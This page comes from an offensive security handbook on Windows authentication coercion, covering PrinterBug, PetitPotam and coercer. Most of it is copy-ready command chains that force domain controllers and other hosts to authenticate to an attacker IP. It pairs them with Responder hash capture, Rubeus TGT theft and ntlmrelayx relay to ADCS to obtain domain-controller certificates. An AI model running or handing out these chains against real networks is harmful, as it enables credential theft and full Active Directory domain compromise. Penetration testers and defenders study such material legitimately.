---
title: "22 · Coercion Attacks"
---

# 22 · Coercion Attacks

> Force a Windows machine to authenticate to you. Pair with relay or unconstrained delegation.

!!! note "Phase overview"
    Coercion turns a target machine into your authentication source. The captured auth can be relayed (to LDAP for DCSync, to ADCS for ESC8 cert), cracked offline, or paired with unconstrained delegation to steal a TGT. PrinterBug is the most reliable; PetitPotam works unauthenticated on older systems; coercer.py tries 12+ protocols.

### 22.1 · PrinterBug (MS-RPRN)

!!! info "Why this works / how it chains"

    MS-RPRN's ***`RpcRemoteFindFirstPrinterChangeNotificationEx`*** tells the spooler service to register for printer change notifications at a UNC path, which causes it to authenticate to that path with the machine account. Most reliable coercion when the Print Spooler is running.

```bash title="PrinterBug variations"
# Some examples:

# Coerce DC to authenticate to attacker
printerbug.py domain.local/user:pass@<DC_IP> <ATTACKER_IP>

# Combined with Responder (capture hash)
responder -I tun0 -rdwv &
printerbug.py domain.local/user:pass@<DC_IP> <ATTACKER_IP>

# Combined with unconstrained delegation
.\Rubeus.exe monitor /interval:5 /nowrap &
printerbug.py domain.local/user:pass@<DC_IP> <UNCONSTRAINED_MACHINE_IP>
```


### 22.2 · PetitPotam (MS-EFSRPC)

!!! info "Why this works / how it chains"

    EFSRPC's ***`EfsRpcOpenFileRaw`*** triggers SMB auth to a UNC path. The big win: works UNAUTHENTICATED on systems unpatched against the original CVE. Pair with NTLM relay to ADCS HTTP enrollment for the canonical `ESC8` chain.

```bash title="PetitPotam + relay to ADCS"
# Some examples:

# Works even unauthenticated (older unpatched systems)
PetitPotam.py <ATTACKER_IP> <TARGET_IP>

# Authenticated version
PetitPotam.py -u user -p pass -d domain.local \
  <ATTACKER_IP> <TARGET_IP>

# Combine with NTLM relay to ADCS (ESC8)
# Terminal 1:
impacket-ntlmrelayx \
  -t http://<CA_IP>/certsrv/certfnsh.asp \
  -smb2support --adcs \
  --template DomainController

# Terminal 2:
PetitPotam.py <ATTACKER_IP> <DC_IP>
```


### 22.3 · Coercion Tools Summary

!!! info "Why this works / how it chains"

    `coercer.py` is the swiss-army knife; scan tries every protocol; coerce fires the working ones. Useful when `PrinterBug` is patched and you don't know which alternative works.

```bash title="coercer scan + coerce"
coercer scan -u user -p pass -d domain.local \
  --target-ip <TARGET_IP> --listener-ip <ATTACKER_IP>

coercer coerce -u user -p pass -d domain.local \
  --target-ip <TARGET_IP> --listener-ip <ATTACKER_IP>

# Available protocols:
# MS-RPRN (PrinterBug)    - most reliable
# MS-EFSRPC (PetitPotam)  - works unauth on old systems
# MS-DFSNM (DFSCoerce)
# MS-FSRVP (ShadowCoerce)
# MS-EVEN6, MS-EFSR variants
```

